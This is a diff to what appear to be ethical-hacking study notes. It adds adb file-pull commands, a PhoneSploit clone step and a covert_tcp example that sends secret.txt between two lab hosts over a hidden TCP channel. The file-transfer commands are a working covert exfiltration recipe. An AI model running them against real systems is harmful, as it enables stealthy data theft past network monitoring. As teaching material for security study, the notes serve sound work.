@@ -355,7 +355,7 @@ adb shell
 adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
 adb pull sdcard/log.txt /home/mmurphy/Desktop
   
- =================================================================================================== 
+# =================================================================================================== 
   
 # Same thing can be done via PhoneSploit tool 
 git clone https://github.com/aerosol-can/PhoneSploit
@@ -390,4 +390,18 @@ sdcard/Download/secret.txt
 <summary>Covert</summary>
   
 > Covert_tcp [source code](covert_tcp.c)
+  
+```shell
+# Compile the Code  
+cc -o covert_tcp covert_tcp.c
+  
+# Reciever Machine(192.168.29.53)  
+sudo ./covert_tcp -dest 192.168.29.53 -source 192.168.29.123 -source_port 9999 -dest_port 8888 -server -file recieve.txt  
+
+  
+# Sender Machine(192.168.29.123) 
+# Create A Message file that need to be transferred Eg:secret.txt
+sudo ./covert_tcp -dest 192.168.29.53 -source 192.168.29.123 -source_port 8888 -dest_port 9999 -file secret.txt
+
+```
 </details>
